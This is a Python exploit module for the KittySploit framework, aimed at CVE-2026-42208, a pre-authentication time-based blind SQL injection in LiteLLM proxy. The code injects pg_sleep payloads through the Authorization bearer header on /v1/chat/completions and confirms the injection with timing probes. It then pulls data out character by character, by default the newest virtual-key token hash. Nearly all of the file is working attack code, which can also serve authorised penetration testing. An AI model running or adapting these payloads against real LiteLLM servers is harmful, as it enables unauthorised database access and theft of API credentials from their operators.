#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-42208 — LiteLLM pre-authentication time-based blind SQL injection."""

import hashlib
import json
import secrets
import statistics
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.sqli_engine.extractor import extract_scalar_blind, make_blind_oracle


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "LiteLLM Pre-Auth Blind SQLi (CVE-2026-42208)",
        "description": (
            "CVE-2026-42208 in BerriAI LiteLLM 1.81.16 <= version < 1.83.7: the proxy virtual-key "
            "lookup builds SQL with WHERE v.token = '{token}' and interpolates the raw bearer from "
            "failed auth logging. Inject via Authorization on LLM routes (must NOT start with sk-). "
            "Calibrates timing, confirms pg_sleep scales, then extracts a SQL scalar via the "
            "framework blind extractor (default: newest LiteLLM_VerificationToken.token hash)."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-42208"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-42208",
            "https://github.com/BerriAI/litellm/security/advisories/GHSA-r75f-5x8p-qvmc",
            "https://bishopfox.com/blog/cve-2026-42208-pre-authentication-sql-injection-in-litellm-proxy",
        ],
        "tags": [
            "litellm",
            "llm",
            "sqli",
            "blind",
            "time-based",
            "pre-auth",
            "postgresql",
            "cve-2026-42208",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 12,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals", "exploit_paths"],
            "cost": 2.0,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["litellm", "openai"],
                "endpoint_pattern_any": ["/v1/chat/completions"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "sqli", "from_detail": "time-based blind oracle"},
                    {"capability": "credentials", "from_detail": "virtual key hash"},
                ],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(4000, "LiteLLM proxy HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    api_path = OptString(
        "/v1/chat/completions",
        "LLM API route for Bearer injection",
        False,
    )
    sleep_s = OptFloat(4.0, "pg_sleep interval used as the timing oracle (seconds)", False)
    extract = OptString(
        '(SELECT token FROM "LiteLLM_VerificationToken" ORDER BY created_at DESC LIMIT 1)',
        "SQL scalar expression to recover after confirmation",
        False,
        advanced=True,
    )
    max_length = OptInteger(256, "Upper bound for length binary search", False, advanced=True)
    threads = OptInteger(
        6,
        "Parallel threads for per-character extraction (higher = noisier oracle)",
        False,
        advanced=True,
    )
    confirm_only = OptBool(False, "Stop after confirming the injection", False)
    manual = OptBool(False, "Send manual_payload verbatim and report latency", False, advanced=True)
    manual_payload = OptString(
        "",
        "Bearer injection string for manual mode (must not start with sk-)",
        False,
        advanced=True,
    )
    verify_key = OptString(
        "",
        "Plaintext virtual key; sha256 compared to extracted hash",
        False,
        advanced=True,
    )
    model = OptString("gpt-3.5-turbo", "Model name in the filler chat body", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self._run_id = secrets.token_hex(3)
        self._nonce_counter = 0
        self._baseline = 0.0
        self._threshold = 0.0
        self._oracle_requests = 0

    def _nonce(self) -> str:
        self._nonce_counter += 1
        return f"{self._run_id}{self._nonce_counter:x}"

    def _post_path(self) -> str:
        base = (self.path or "/").rstrip("/")
        suffix = str(self.api_path or "/v1/chat/completions")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _request_timeout(self) -> int:
        sleep_val = float(self.sleep_s or 4.0)
        return max(int(self.timeout or 20), int(sleep_val * 3 + 20))

    def _payload_baseline(self) -> str:
        return f"x' OR '1'='2' -- {self._nonce()}"

    def _payload_sleep(self, seconds: float) -> str:
        return f"x' OR (SELECT 1 FROM pg_sleep({seconds})) IS NOT NULL -- {self._nonce()}"

    def _payload_cond(self, predicate: str, seconds: float) -> str:
        return (
            f"x' OR (SELECT CASE WHEN ({predicate}) THEN "
            f"(SELECT count(*) FROM pg_sleep({seconds})) ELSE 0 END) > -1 "
            f"-- {self._nonce()}"
        )

    def _payload_hashed_control(self, seconds: float) -> str:
        return "sk-" + self._payload_sleep(seconds)

    def _send_bearer(self, bearer: str):
        self._oracle_requests += 1
        body = json.dumps(
            {
                "model": str(self.model or "gpt-3.5-turbo"),
                "messages": [{"role": "user", "content": "hi"}],
            }
        )
        started = time.perf_counter()
        response = self.http_request(
            method="POST",
            path=self._post_path(),
            headers={
                "Authorization": f"Bearer {bearer}",
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
            data=body,
            timeout=self._request_timeout(),
            allow_redirects=False,
        )
        elapsed = time.perf_counter() - started
        status = int(response.status_code) if response else None
        snippet = (response.text or "")[:400] if response else ""
        return status, elapsed, snippet

    def _calibrate(self, samples: int = 3):
        times = []
        status = None
        for _ in range(samples):
            status, elapsed, _snippet = self._send_bearer(self._payload_baseline())
            times.append(elapsed)
        self._baseline = statistics.median(times)
        sleep_val = float(self.sleep_s or 4.0)
        self._threshold = max(sleep_val * 0.5, self._baseline * 4)
        return status, self._baseline, times

    def _oracle_probe(self, predicate: str) -> bool:
        sleep_val = float(self.sleep_s or 4.0)
        _status, elapsed, _snippet = self._send_bearer(
            self._payload_cond(predicate, sleep_val)
        )
        return elapsed >= self._threshold

    def _oracle_ask(self, predicate: str) -> bool:
        if not self._oracle_probe(predicate):
            return False
        if self._oracle_probe(predicate):
            return True
        return self._oracle_probe(predicate)

    def _confirm(self, verbose: bool = True):
        detail = {}
        status, baseline, samples = self._calibrate()
        detail["baseline"] = baseline
        detail["baseline_samples"] = samples
        detail["status"] = status
        if verbose:
            sample_text = ", ".join(f"{s:.3f}" for s in samples)
            print_info(f"baseline (x' OR '1'='2') : {baseline:.3f}s  [{sample_text}]")

        sleep_val = float(self.sleep_s or 4.0)
        sleep2 = sleep_val * 2
        st1, t1, _b1 = self._send_bearer(self._payload_sleep(sleep_val))
        st2, t2, _b2 = self._send_bearer(self._payload_sleep(sleep2))
        _stc, tc, _bc = self._send_bearer(self._payload_hashed_control(sleep_val))
        detail["t1"] = t1
        detail["t2"] = t2
        detail["sk_control"] = tc
        detail["status"] = st1 if st1 is not None else status

        if verbose:
            print_info(f"pg_sleep({sleep_val:g}) probe        : {t1:.3f}s  (HTTP {st1})")
            print_info(f"pg_sleep({sleep2:g}) probe        : {t2:.3f}s  (HTTP {st2})")
            print_info(f"sk- prefixed control           : {tc:.3f}s  (hashed, must be fast)")

        delayed = t1 >= self._threshold
        scales = t2 >= t1 + (sleep_val * 0.5)
        control_fast = tc < self._threshold
        detail["delayed"] = delayed
        detail["scales"] = scales
        detail["control_fast"] = control_fast
        detail["confirmed"] = bool(delayed and scales and control_fast)
        return detail["confirmed"], detail

    def _diagnose(self, detail: dict) -> str:
        sleep_val = float(self.sleep_s or 4.0)
        if detail.get("status") is None:
            return "no HTTP response — host unreachable or route wrong"
        if not detail.get("delayed"):
            baseline = detail.get("baseline", 0.0)
            if baseline > sleep_val * 0.5:
                return (
                    f"every payload is slow ({baseline:.2f}s baseline) — backoff noise or loaded host, "
                    "not pg_sleep"
                )
            return (
                f"flat timing (baseline {baseline:.3f}s, sleep probe {detail.get('t1', 0):.3f}s) — "
                "target is 1.83.7+, disable_error_logs set, or no Postgres backend"
            )
        if not detail.get("scales"):
            return (
                f"delay does not scale with interval "
                f"({detail.get('t1', 0):.2f}s vs {detail.get('t2', 0):.2f}s) — backoff false positive"
            )
        if not detail.get("control_fast"):
            return (
                f"sk- control was also delayed ({detail.get('sk_control', 0):.2f}s) — "
                "latency is not payload-dependent"
            )
        return "no timing evidence"

    def check(self):
        ok, detail = self._confirm(verbose=False)
        if ok:
            sleep_val = float(self.sleep_s or 4.0)
            return {
                "vulnerable": True,
                "reason": (
                    f"pre-auth blind SQLi confirmed — baseline {detail['baseline']:.3f}s, "
                    f"pg_sleep({sleep_val:g}) {detail['t1']:.3f}s"
                ),
                "confidence": "high",
                "detail": detail,
            }
        return {
            "vulnerable": False,
            "reason": f"no injection — {self._diagnose(detail)}",
            "confidence": "high",
            "detail": detail,
        }

    def run(self):
        try:
            print_status("CVE-2026-42208 — LiteLLM pre-auth time-based blind SQLi")
            print_info(f"POST {self._post_path()}")

            if self.manual:
                payload = (self.manual_payload or "").strip()
                if not payload:
                    print_error("manual_payload is required when manual=true")
                    return False
                if payload.startswith("sk-"):
                    print_warning(
                        "manual_payload starts with sk- — LiteLLM hashes that prefix before the "
                        "vulnerable lookup"
                    )
                self._calibrate()
                status, elapsed, body = self._send_bearer(payload)
                print_info(f"payload : {payload}")
                print_info(
                    f"HTTP {status} in {elapsed:.3f}s (baseline {self._baseline:.3f}s, "
                    f"threshold {self._threshold:.3f}s)"
                )
                if body:
                    print_info(body[:400])
                if elapsed >= self._threshold:
                    print_success(
                        f"payload delayed the response by {elapsed:.2f}s "
                        f"(baseline {self._baseline:.3f}s)"
                    )
                    return True
                print_error("no timing evidence for manual payload")
                return False

            ok, detail = self._confirm(verbose=True)
            if not ok:
                print_error(f"no injection — {self._diagnose(detail)}")
                return False

            sleep_val = float(self.sleep_s or 4.0)
            print_success(
                f"pre-auth blind SQLi confirmed — HTTP {detail.get('status')} delayed "
                f"{detail['t1']:.2f}s by pg_sleep({sleep_val:g}) "
                f"(baseline {detail['baseline']:.3f}s)"
            )

            if self.confirm_only:
                return True

            expr = (self.extract or "").strip()
            if not expr:
                print_info("No extract expression set — confirmation only")
                return True

            print_status(f"Extracting: {expr}")
            if self._oracle_ask(f"({expr}) IS NULL"):
                print_warning("expression is NULL — no such row")
                return True

            started = time.time()
            before = self._oracle_requests
            value = extract_scalar_blind(
                make_blind_oracle(self._oracle_ask),
                expr,
                threads=int(self.threads or 6),
                max_length=int(self.max_length or 256),
            )
            took = time.time() - started
            requests = self._oracle_requests - before

            if value is None:
                print_warning("extraction failed or hit max_length")
                return True

            print_success(f"Extracted value:\n{value}")
            print_info(f"{len(value)} characters in {took:.0f}s (~{requests} oracle requests)")

            verify = (self.verify_key or "").strip()
            if verify:
                digest = hashlib.sha256(verify.encode()).hexdigest()
                match = digest == value
                print_info(f"sha256(verify_key): {digest}")
                print_info(f"match             : {'YES' if match else 'NO'}")
                if match:
                    print_success(f"extracted hash is sha256('{verify}')")

            return True

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
